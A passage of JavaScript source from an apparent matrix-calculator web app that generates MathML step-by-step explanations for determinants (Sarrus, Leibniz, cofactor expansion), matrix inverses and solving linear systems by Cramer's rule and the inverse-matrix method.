  "matrix5x3": "<math><mtable rowspacing=\"0ex\" columnlines=\"none none dashed none\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr></mtable></math>",
  "determinantSarrus": "${determinant3x3}<table class=\"some-details-table\"><tr><td><math><mrow><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>+</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>+</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,1],[1,2],[2,3]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,2],[1,3],[2,4]]\">${matrix5x3}</span></span></span></td></tr><tr><td><math><mrow><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&minus;</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&minus;</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow></math>${link}</td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,3]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,3],[2,4]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,2],[1,1],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,3],[1,2],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,4],[1,3],[2,2]]\">${matrix5x3}</span></span></span></span></span></span></td></tr></table>",
  "someDetails3": "<span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,2],[2,0]]\"><math><mtable rowspacing=\"0ex\"><mtr><mtd><mstyle mathvariant=\"bold\"><menclose notation=\"circle\"><msub><mi>a</mi><mrow><mi>r</mi><mo>,</mo><mi>c</mi></mrow></msub></menclose></mstyle></mtd><mtd><mtext>&hellip;</mtext></mtd><mtd><msub><mi>a</mi><mrow><mi>r</mi><mo>,</mo><mi>j</mi></mrow></msub></mtd></mtr><mtr><mtd><mtext>&vellip;</mtext></mtd><mtd></mtd><mtd><mtext>&vellip;</mtext></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mi>i</mi><mo>,</mo><mi>c</mi></mrow></msub></mtd><mtd><mtext>&hellip;</mtext></mtd><mtd><msub><mi>a</mi><mrow><mi>i</mi><mo>,</mo><mi>j</mi></mrow></msub></mtd></mtr></mtable></math></span></span>",
  "": ""
};

Expression.getSomeDetails = function (id, printOptions) {
  var s = Expression.someDetailsNew[id];
  return s.replace(/\$\{determinant3x3\}/g, Expression.someDetailsNew.determinant3x3)
          .replace(/\$\{matrix3x3\}/g, Expression.someDetailsNew.matrix3x3)
          .replace(/\$\{matrix5x3\}/g, Expression.someDetailsNew.matrix5x3);
};

Expression.Details.add({
  type: "inverse-2x2",
  i18n: undefined,
  minRows: 2,
  maxRows: 2,
  priority: 1,
  callback: function (printOptions, matrix) {
    var html = "";
    html += "<div>";
    html += i18n.inverse2x2;
    html += " ";
    html += "<math>";
    html += Expression.p("A^-1={{a, b}, {c, d}}^-1=1/determinant(A)*{{C_11, C_21}, {C_12, C_22}}=1/(a*d-b*c)*{{d, -b}, {-c, a}}");
    html += "</math>";
    html += i18n.inverse2x2Link;
    html += "</div>";
    var det = matrix.e(0, 0).multiply(matrix.e(1, 1)).subtract(matrix.e(0, 1).multiply(matrix.e(1, 0)));
    // TODO: highlight (?)
    html += "<math>";
    html += Expression.p("A^-1=1/(a*d-b*c)*{{d, n}, {m, a}}" + (det.equals(Expression.ZERO) ? "=1/0*{{d, n}, {m, a}}" : "=t"), {
      A: new Expression.Matrix(matrix),
      a: matrix.e(0, 0),
      b: matrix.e(0, 1),
      c: matrix.e(1, 0),
      d: matrix.e(1, 1),
      n: matrix.e(0, 1).negate(),
      m: matrix.e(1, 0).negate(),
      t: det.equals(Expression.ZERO) ? undefined : new Expression.Matrix(matrix.inverse())
    }, printOptions);
    html += "</math>";
    return html;
  }
});

Expression.Details.add({
  type: "determinant-2x2",
  i18n: undefined,
  minRows: 2,
  maxRows: 2,
  priority: 1,
  callback: function (printOptions, matrix) {
    var html = "<div>" + Expression.getSomeDetails("determinant2x2", printOptions).replace(/\$\{link\}/g, i18n.determinant2x2Link) + "</div>";
    var determinantResult = matrix.e(0, 0).multiply(matrix.e(1, 1)).subtract(matrix.e(0, 1).multiply(matrix.e(1, 0)));
    html += "<math>";
    html += Expression.p("determinant(A)=a*d-b*c=r", {
      A: new Expression.Matrix(matrix),
      a: matrix.e(0, 0),
      b: matrix.e(0, 1),
      c: matrix.e(1, 0),
      d: matrix.e(1, 1),
      r: determinantResult
    }, printOptions);
    html += "</math>";
    return html;
  }
});

// ---------------------------------------- determinant -----------------------------------------------

function Myelem(m, a, z) {
  this.m = m;
  this.a = a;// Fraction
  this.z = z;// number
}

var getDeterminant = function (matrix, k, r, z, koef) {
  if (matrix.cols() === 1) {
    return matrix.e(0, 0);
  }

  var o = Expression.ZERO;

  var i = -1;
  while (++i < matrix.cols()) {

    // complement matrix for element e(i, k)
    var mx = matrix.minorMatrix(i, k);

    var kk = koef.multiply(matrix.e(i, k));
    if (2 * Math.floor((i + k) / 2) !== i + k) {
      kk = kk.negate();
    }
    r.push(new Myelem(mx, kk, z));
    o = o.add(matrix.e(i, k).multiply(getDeterminant(mx, 0, r, z + 1, kk)));
  }
  return o;
};

Expression.expandDeterminant = function (matrix, byRow, number, printOptions) {
    var r = [];
    var k = Number.parseInt(number, 10) - 1;

    //!
    if (!matrix.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }
    if (k >= matrix.rows() || k < 0 || k !== Math.floor(k)) { // matrix.isSquare() === true
      throw new RangeError("IntegerInputError" + ":" + number);
    }
    //!
    
    r.push(new Myelem(matrix, Expression.ONE, 0));
    if (byRow) {
      // expansion by row k
      getDeterminant(matrix.transpose(), k, r, 1, Expression.ONE);
      var l = -1;
      while (++l < r.length) {
        r[l].m = r[l].m.transpose();
      }
      
    } else {
      getDeterminant(matrix, k, r, 1, Expression.ONE);// expansion by column k
    }
    var html = "";
    html += "<math>";
    var z = r[0].m.cols() - 1;
    var i = -1;
    while (++i < z) {
      var j = -1;
      var e = undefined;
      while (++j < r.length) {
        if (r[j].z === i && !r[j].a.equals(Expression.ZERO)) {
          var current = undefined;
          var det = new Expression.Determinant(new Expression.Matrix(r[j].m));
          if (i === 0 && r[j].a.equals(Expression.ONE)) {
            current = det;
          } else {
            current = new Expression.Multiplication(r[j].a, det);
          }
          e = e == undefined ? current : new Expression.Addition(e, current);
        }
      }
      if (e != undefined) { // all zeros
        html += e.toMathML(printOptions);
        html += "<mo>=</mo>";
      }
    }
    html += matrix.determinant().toMathML(printOptions);
    html += "</math>";
    return html;
};


Expression.Details.add({
  type: "eigenvectors",
  callback: function (printOptions, matrix) {
    if (!matrix.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }

    var html = "";
    html += "<ol>";
    var tmp = Expression.getEigenvaluesWithSteps(printOptions, matrix);
    var eigenvalues = tmp.eigenvalues;
    html += "<li>";
    html += tmp.html;
    html += "</li>";
    if (eigenvalues.length > 0) {
      var tmp2 = Expression.getEigenvectorsWithSteps(printOptions, matrix, eigenvalues);
      html += "<li>";
      html += tmp2.html;
      html += "</li>";
    } else {
      html += "<li>";
      html += i18n.thereAreNoRationalSolutions;
      html += "</li>";
    }
    html += "</ol>";
    return html;
  }
});

//!
Expression.Details.add({
  type: "expand-along-column",
  callback: function (printOptions, matrix, columnNumber) {
    return Expression.expandDeterminant(matrix, false, columnNumber.toString(), printOptions);
  }
});
Expression.Details.add({
  type: "expand-along-row",
  callback: function (printOptions, matrix, rowNumber) {
    return Expression.expandDeterminant(matrix, true, rowNumber.toString(), printOptions);
  }
});
Expression.Details.add({
  type: "obtain-zeros-in-column",
  callback: function (printOptions, matrix, columnNumber) {
    return Expression.getZero(matrix, false, columnNumber.toString(), printOptions);
  }
});
Expression.Details.add({
  type: "obtain-zeros-in-row",
  callback: function (printOptions, matrix, rowNumber) {
    return Expression.getZero(matrix, true, rowNumber.toString(), printOptions);
  }
});

var determinant3x3 = function (printOptions, matrix, text) {
    var containerId = printOptions.idPrefix + "-" + Expression.id();
    if (matrix.cols() !== 3 || matrix.rows() !== 3) {
      throw new RangeError("NonSquareMatrixException:" + i18n.theRuleOfSarrusCanBeUsedOnlyWith3x3Matrices);
    }
//TODO: replace
    var matrixId = containerId;
    var cellId = function (i, j) {
      return matrixId + "_" + i.toString() + "_" + j.toString();
    };
    var higlights = "";
    var html = "";
    //html += "<div>" + text + "</div>";
    html += "<div class=\"math-block\">" + text + "</div>";
    html += "<math>";
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return cellId(i, j);
      }
    }));
    html += "<mo>=</mo>";
    html += "<mrow>";
    // TODO: clickable highlight with initially selected group
    var z = [
      "a_11*a_22*a_33",
      "a_12*a_23*a_31",
      "a_13*a_21*a_32",
      "a_31*a_22*a_13",
      "a_32*a_23*a_11",
      "a_33*a_21*a_12"
    ];
    var context = new ExpressionParser.Context(function (id) {
      return matrix.e(Number.parseInt(id.slice(2, 3), 10) - 1, Number.parseInt(id.slice(3, 4), 10) - 1);
    });
    var determinant = undefined;
    for (var i = 0; i < z.length; i += 1) {
      var e = ExpressionParser.parse(z[i], context);
      if (i !== 0) {
        var sign = i < 3 ? "+" : "&minus;";
        html += "<mo>" + sign + "</mo>";
      }
      var highlight = z[i].replace(/a_(\d)(\d)\*?/g, function (x, si, sj) {
        var i = Number.parseInt(si, 10) - 1;
        var j = Number.parseInt(sj, 10) - 1;
        return "#" + cellId(i, j) + ", ";
      }).slice(0, -2);
      html += "<mrow id=\"" + (matrixId + "_x" + i.toString()) + "\">";
      html += e.toMathML(Object.assign({}, printOptions, {isTopLevel: false}));
      html += "</mrow>";
      higlights += "<a class=\"a-highlight\" data-for=\"" + (matrixId + "_x" + i.toString()) + "\" data-highlight=\"" + highlight + "\"></a>";
      determinant = i === 0 ? e : (i < 3 ? determinant.add(e) : determinant.subtract(e));
    }
    html += "</mrow>";
    html += "<mo>=</mo>";
    html += determinant.simplify().toMathML(printOptions);
    html += "</math>";
    html += '<div hidden>' + higlights + '</div>';
    return html;
};

//TODO: fix - i18n.usingSarrusRule
Expression.Details.add({
  type: "determinant-Sarrus",
  i18n: function () {
    return i18n.ruleOfSarrus;
  },
  minRows: 3,
  maxRows: 3,
  priority: 3,
  callback: function (printOptions, matrix) {
    return determinant3x3(printOptions, matrix, Expression.getSomeDetails("determinantSarrus", printOptions).replace(/\$\{link\}/g, i18n.ruleOfSarrusLink));
  }
});

Expression.Details.add({
  type: "determinant-Triangle",
  i18n: function () {
    return i18n.ruleOfTriangle;
  },
  minRows: 3,
  maxRows: 3,
  priority: 4,
  callback: function (printOptions, matrix) {
    return determinant3x3(printOptions, matrix, Expression.getSomeDetails("determinantTriangle", printOptions).replace(/\$\{link\}/g, i18n.ruleOfTriangleLink));
  }
});

// https://www.math.susu.ac.ru/193-2.html
// https://en.wikipedia.org/wiki/Permutation#Generation_in_lexicographic_order
Matrix.permutations = function (n, callback) {
  if (n !== Math.floor(n) || n < 1) {
    throw new RangeError();
  }
  var p = new Array(n);
  var even = true;
  var i = -1;
  while (++i < n) {
    p[i] = i;
  }
  var k = 0;
  var l = 0;
  var t = 0;

  while (true) {
    callback(p, even);
    k = n - 2;
    l = n - 1;

    while (k >= 0 && p[k] > p[k + 1]) {
      k -= 1;
    }

    if (k < 0) {
      return;
    }

    while (p[k] > p[l]) {
      l -= 1;
    }

    t = p[k];
    p[k] = p[l];
    p[l] = t;
    even = !even;

    // reverse
    i = k + 1;
    while (i < n - i + k) {
      t = p[n - i + k];
      p[n - i + k] = p[i];
      p[i] = t;
      even = !even;
      i += 1;
    }
  }
};

Matrix.prototype.determinantLeibniz = function () {
  if (!this.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }
  var determinant = undefined;
  var matrix = this;
  Matrix.permutations(this.cols(), function (p, even) {
    var t = undefined;
    for (var i = 0; i < p.length; i += 1) {
      var e = matrix.e(i, p[i]);
      t = t == undefined ? e : t.multiply(e);
    }
    determinant = determinant == undefined ? (even ? t : t.negate()) : (even ? determinant.add(t) : determinant.subtract(t));
  });
  return determinant;
};

//???
Expression.Details.add({
  type: "determinant-Leibniz",
  i18n: function () {
    return i18n.formulaOfLeibniz;
  },
  minRows: 4,
  maxRows: 6,//?
  priority: -1,
  callback: function (printOptions, matrix) {
    var highlights = '';
    var html = "";
    html += "<math>";
    if (true) {
    var nsMatrix = matrix.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });
    html += new Expression.Determinant(new Expression.Matrix(nsMatrix)).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return nsMatrix.e(i, j).getId();
      }
    }));
    html += "<mo>=</mo>";
    var e = nsMatrix.determinantLeibniz();
    var elements = [];
    for (var s = e; s != null; s = (s.unwrap() instanceof Expression.Addition || s.unwrap() instanceof Expression.Subtraction) && s.unwrap().a instanceof NonSimplifiedExpression ? s.unwrap().a : null) {
      var x = (s.unwrap() instanceof Expression.Addition || s.unwrap() instanceof Expression.Subtraction) && s.unwrap().a instanceof NonSimplifiedExpression ? s.unwrap().b : s;
      elements.push({e: x, sign: s.unwrap() instanceof Expression.Subtraction ? '&minus;' : '+'});
    }
    html += elements.length !== 1 ? '<mrow>' : '';
    for (var i = elements.length - 1; i >= 0; i -= 1) {
      var x = elements[i].e;
      var sign = elements[i].sign;
      if (i !== elements.length - 1 || sign !== '+') {
        //TODO: some details about sign
        html += '<mo lspace="0.62em" rspace="0.62em">' + sign + '</mo>';
      }
      html += "<mrow id=\"" + x.getId() + "\">";
      html += x.toMathML(printOptions);
      html += "</mrow>";
      
      var highlight = '<a class="a-highlight" data-for="' + x.getId().toString() + '" data-highlight="' + x.unwrap().getIds() + '"></a>';
      highlights += highlight;
    }
    html += elements.length !== 1 ? '</mrow>' : '';
    } else {
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions);
    //TODO: formula - ?
    //html += "<mo>=</mo>";
    //html += "";
    html += "<mo>=</mo>";
    html += matrix.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    }).determinantLeibniz().toMathML(printOptions);
    }
    if (matrix.cols() > 1) {
      html += "<mo>=</mo>";
      html += matrix.determinantLeibniz().toMathML(printOptions);
    }
    html += "</math>";
    html += " ";
    html += i18n.determinantLeibnizLink;
    html += '<div hidden>' + highlights + '</div>';
    return html;
  }
});

Expression.mgetZero = function (m, k) { // m == n ; in a column k -- find in k-column non-zero element and ... subtract
    var i = 0;
    while (i < m.rows() && m.e(i, k).equals(Expression.ZERO)) {
      i += 1;
    }
    if (i < m.rows()) {
      var r = [];
      var j = -1;
      while (++j < m.rows()) {
        if (j !== i) {
          m = m.rowReduce(j, i, k);
          r.push(m);
        }
      }
      return {dets: r, c: {e: m.e(i, k), i: i, j: k}};// r?
    }
    return {dets: [], c: null};
};

//TODO: better details
Expression.getZero = function (matrix, atRow, number, printOptions) {
    var k = Number.parseInt(number, 10) - 1;
    //!
    if (!matrix.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }
    if (k >= matrix.rows() || k < 0 || k !== Math.floor(k)) { // matrix.isSquare() === true
      throw new RangeError("IntegerInputError" + ":" + number);
    }
    //!

    var html = "";
    html += "<math>";
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions);
    html += "<mo>=</mo>";

    var tmp = Expression.mgetZero(atRow ? matrix.transpose() : matrix, k);
    var dets = tmp.dets;
    var c = tmp.c;

    for (var i = 0; i < dets.length; i += 1) {
      html += (i === 0 ? "" : "<mo>=</mo>") + new Expression.Determinant(new Expression.Matrix(atRow ? dets[i].transpose() : dets[i])).toMathML(printOptions);
      //TODO: arrow-with-label - ?
    }

    if (dets.length > 0) {
      html += "<mo>=</mo>";
    }
    var result = null;
    if (c == null) {
      result = Expression.ZERO;
    } else {
      var t = (dets.length === 0 ? matrix : dets[dets.length - 1]).minorMatrix(c.i, c.j);
      if (t.cols() === 0) {
        result = c.e;
      } else {
        result = c.e.multiply(t.determinant());
        html += new Expression.Multiplication(c.e, new Expression.Determinant(new Expression.Matrix(atRow ? t.transpose() : t))).toMathML(printOptions);
        html += "<mo>=</mo>";
      }
    }
    html += result.toMathML(printOptions);
    html += "</math>";
    return html;
};
// --------------------------------------------- end ----------------------------------------------
// ---------------------------------------- sle -----------------------------------------------

Matrix.trimRight = function (x) {
  var lastColumn = 0;
  x.map(function (e, i, j) {
    if (lastColumn < j && !e.equals(Expression.ZERO)) {
      lastColumn = j;
    }
    return e;
  });
  return x.slice(0, x.rows(), 0, lastColumn + 1);
};

var testSLECompatibility = function (printOptions, fullMatrix) {
  if (fullMatrix.cols() < 2) {
    throw new RangeError("ValueMissingError:A-textarea");//TODO: fix
  }

  var st = "<h4>" + i18n.analyseCompatibilityOfTheSystem + "</h4>";
  //TODO: fix i18n
  st += "<p>" + i18n.analyseCompatibilityIntroduction + "</p>";
  var m = Matrix.trimRight(fullMatrix.slice(0, fullMatrix.rows(), 0, fullMatrix.cols() - 1));
  var b = fullMatrix.slice(0, fullMatrix.rows(), fullMatrix.cols() - 1, fullMatrix.cols());
  var augmented = m.augment(b);
  
  var results = [];
  Matrix.toRowEchelonWithCallback(augmented, Matrix.GaussMontante, "", null, function (result) {
    results.push(result);
  });
  
if (results.length > 1) {
  st += "<ol>";
}
for (var i = 0; i < results.length; i += 1) {
  st += results.length > 1 ? "<li><div>" + "<math>" + results[i].condition.toMathML(printOptions) + "</math>" : "";
  var t = results[i].matrix;
  var mRank = t.slice(0, t.rows(), 0, t.cols() - 1).rank();
  var augmentedRank = t.rank();
  //var mRank = m.rank();
  //var augmentedRank = augmented.rank();
  st += "<div>";
  st += "<math>";
  st += new Expression.Rank(new Expression.Matrix(augmented)).toMathML(Object.assign({}, printOptions, {columnlines: -1})) + "<mo>=</mo><mn>" + augmentedRank.toString() + "</mn>";
  st += "</math>";
  st += "</div>";
  //st += createDetailsSummary(printOptions.idPrefix, [{type: "rank", matrix: augmented.toString(), second: undefined}]);
  st += "<div>";
  st += "<math>";
  st += new Expression.Rank(new Expression.Matrix(m)).toMathML(printOptions) + "<mo>=</mo><mn>" + mRank.toString() + "</mn>";
  st += "</math>";
  st += "</div>";
  //st += createDetailsSummary(printOptions.idPrefix, [{type: "rank", matrix: m.toString(), second: undefined}]);
  st += "<div>";
  if (mRank === augmentedRank) {
    if (m.cols() === mRank) {
      st += i18n.theSystemIsConsistentAndItHasAUniqueSolution;
    } else {
      st += i18n.theSystemIsConsistentAndItHasInfiniteNumberOfSolutions;
    }
  } else {
    st += i18n.theSystemIsInconsistent;
  }
  st += "</div>";
  st += results.length > 1 ? "</div></li>" : "";
}
if (results.length > 1) {
  st += "</ol>";
}

  //!new
  st += createDetailsSummary(printOptions.idPrefix, [{type: "rank", matrix: augmented.toString(), second: undefined}]);
  //!new
  return st;
};

Expression.Details.add({
  type: "analyse-compatibility",
  i18n: function () {
    return i18n.testForConsistency; //?
  },
  priority: 1,
  callback: function (printOptions, matrix) {
    return testSLECompatibility(printOptions, matrix);
  }
});

  //TODO: move
  var outSystem = function (printOptions, matrix, variableNames) {
    return new Expression.Matrix(matrix).toMathML(Object.assign({}, printOptions, {
      variableNames: variableNames,
      useBraces: ["{", " "]
    }));
  };
  //! TODO: (!)

var makeDefaultVariableNames = function (count) {
  var variableNames = new Array(count);
  for (var i = 0; i < count; i += 1) {
    variableNames[i] = "x_" + (i + 1).toString();
  }
  return variableNames;
};
  
var solveUsingCramersRule = function (printOptions, fullMatrix, variableNames) {
  if (fullMatrix.cols() < 2) {
    throw new RangeError("ValueMissingError:A-textarea");//TODO: fix
  }

  // TODO: fix
  //!hack
  if (variableNames == undefined) {
    variableNames = makeDefaultVariableNames(fullMatrix.cols() - 1);
  }

  var m = Matrix.trimRight(fullMatrix.slice(0, fullMatrix.rows(), 0, fullMatrix.cols() - 1));
  var b = fullMatrix.slice(0, fullMatrix.rows(), fullMatrix.cols() - 1, fullMatrix.cols());

  if (!m.isSquare()) {
    throw new RangeError("NonSquareMatrixException:" + i18n.forSolutionUsingCramersRuleNumberOfEquationsShouldBeEqualNumberOfVariables);
  }
  var D0 = m.determinant();
  var mstr = "";
  mstr = "<h4>" + i18n.solutionByRuleOfCramer + "</h4>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += outSystem(printOptions, fullMatrix, variableNames);
  mstr += "</math>";
  mstr += "</div>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mi>&Delta;</mi>";
  mstr += "<mo>=</mo>" + new Expression.Determinant(new Expression.Matrix(m)).toMathML(printOptions);
  mstr += "<mo>=</mo>" + D0.toMathML(printOptions);
  mstr += "</math>";
  mstr += "</div>";
  mstr += createDetailsSummary(printOptions.idPrefix, [{type: m.getDeterminantEventType("determinant").type, matrix: m.toString(), second: undefined}]);
  if (D0.equals(Expression.ZERO)) {
    //TODO: fix text
    mstr += "<div>";
    mstr += i18n.forSolutionUsingCramersRuleCoefficientMatrixShouldHaveNonZeroDeterminant;
    mstr += "</div>";
    return mstr;
  }

  var d = new Array(m.cols());

  mstr += '<ul class="list-unstyled">';
  for (var i = 0; i < m.cols(); i += 1) {
    mstr += "<li>";
    var m1 = m.map(function (e, row, col) {
      return col === i ? b.e(row, 0) : e;
    });
    d[i] = m1.determinant();
    mstr += "<math>";
    mstr += "<msub><mi>&Delta;</mi><mn>" + (i + 1) + "</mn></msub>" +
            "<mo>=</mo>" + new Expression.Determinant(new Expression.Matrix(m1)).toMathML(printOptions) +
            "<mo>=</mo>" + d[i].toMathML(printOptions);
    mstr += "</math>";
    mstr += "; ";
    mstr += createDetailsSummary(printOptions.idPrefix, [{type: m1.getDeterminantEventType("determinant").type, matrix: m1.toString(), second: undefined}]);
    mstr += "</li>";
  }
  mstr += '</ul>';
  mstr += '<ul class="list-unstyled">';
  for (var i = 0; i < m.cols(); i += 1) {
    mstr += "<li>";
    mstr += "<math>";
    mstr += new Expression.Symbol(variableNames[i]).toMathML(printOptions);
    var deltaI = new NonSimplifiedExpression(d[i]).divide(new NonSimplifiedExpression(D0));
    var deltaISimplified = deltaI.simplify();
    mstr += "<mo>=</mo>" + "<mrow><msub><mi>&Delta;</mi><mn>" + (i + 1) + "</mn></msub><mo>&#x2215;</mo><mi>&Delta;</mi></mrow>";
    mstr += "<mo>=</mo>" + deltaI.toMathML(printOptions);
    if (deltaI.toString() !== deltaISimplified.toString()) {//?
      mstr += "<mo>=</mo>" + deltaISimplified.toMathML(printOptions);
    }
    mstr += "</math>";
    mstr += "</li>";
  }
  mstr += "</ul>";

  mstr += "<div>" + i18n.answer + "</div>";
  mstr += '<ul class="list-unstyled">';
  for (var i = 0; i < m.cols(); i += 1) {
    mstr += "<li>";
    mstr += "<math>";
    mstr += new Expression.Symbol(variableNames[i]).toMathML(printOptions) + "<mo>=</mo>" + d[i].divide(D0).toMathML(printOptions);
    mstr += "</math>";
    mstr += "</li>";
  }
  mstr += '</ul>';

  //TODO: ? use cases ? t*x=t - ?
  var condition = Condition.TRUE.andNotZero(D0);
  if (!condition.isTrue()) {
    mstr += "<div>";
    mstr += "<math>";
    mstr += "<mrow><mo>(</mo>";
    mstr += condition.toMathML(printOptions);
    mstr += "<mo>)</mo></mrow>";
    mstr += "</math>";
    mstr += "</div>";
  }

  //TODO: some text about solution when !condition.isFalse()

  return mstr;
};

// SLE solution with inverse matrix
var solveUsingInverseMatrixMethod = function (printOptions, fullMatrix, variableNames) {
  if (fullMatrix.cols() < 2) {
    throw new RangeError("ValueMissingError:A-textarea");//TODO: fix
  }

  //TODO: use variableNames (?)

  var m = Matrix.trimRight(fullMatrix.slice(0, fullMatrix.rows(), 0, fullMatrix.cols() - 1));
  var b = fullMatrix.slice(0, fullMatrix.rows(), fullMatrix.cols() - 1, fullMatrix.cols());

    var mstr = "";
    var c = undefined;
    if (!m.isSquare()) {
        throw new RangeError("NonSquareMatrixException:" + i18n.toSolveSystemByInverseMatrixMethodNumberOfEquationsShouldBeEqualNumberOfVariables);
    }
    try {
      c = m.inverse();
    } catch (error) {
      if (error instanceof RangeError && error.message.indexOf("SingularMatrixException") === 0) {
        //mstr = i18n.toSolveSystemByInverseMatrixMethodCoefficientMatrixShouldHaveNonZeroDeterminant;
      } else {
        throw error;
      }
    }
  mstr += "<h4>" + i18n.solutionByInverseMatrixMethod + "</h4>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mrow><mi>A</mi><mo>&times;</mo><mi>X</mi></mrow><mo>=</mo><mi>B</mi>";
  mstr += "</math>";
  mstr += "</div>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mi>A</mi><mo>=</mo>" + new Expression.Matrix(m).toMathML(printOptions);
  mstr += "</math>";
  mstr += "</div>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mi>B</mi><mo>=</mo>" + new Expression.Matrix(b).toMathML(printOptions);
  mstr += "</math>";
  mstr += "</div>";
  if (c != undefined) {
    mstr += "<div>";
    mstr += "<math>";
    mstr += "<msup><mi>A</mi><mrow><mo>&minus;</mo><mn>1</mn></mrow></msup><mo>=</mo>" + new Expression.Matrix(c).toMathML(printOptions);
    mstr += "</math>";
    mstr += "</div>";
    mstr += createDetailsSummary(printOptions.idPrefix, [{type: m.getDeterminantEventType("inverse").type, matrix: m.toString(), second: undefined}]);
    mstr += "<div>";
    mstr += "<math>";
